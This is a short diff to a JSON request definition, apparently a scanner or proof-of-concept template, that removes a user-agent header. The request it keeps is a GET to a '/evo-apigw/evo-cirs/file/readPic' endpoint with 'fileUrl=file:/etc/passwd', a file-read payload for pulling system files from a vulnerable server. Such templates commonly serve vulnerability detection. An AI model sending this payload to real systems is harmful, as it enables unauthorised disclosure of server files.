@@ -5,7 +5,6 @@
       "method": "GET",
       "uri": "/evo-apigw/evo-cirs/file/readPic?fileUrl=file:/etc/passwd",
       "headers":{
-        "user-agent": "5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
         "content-type": "application/json"
       },
       "data": "",
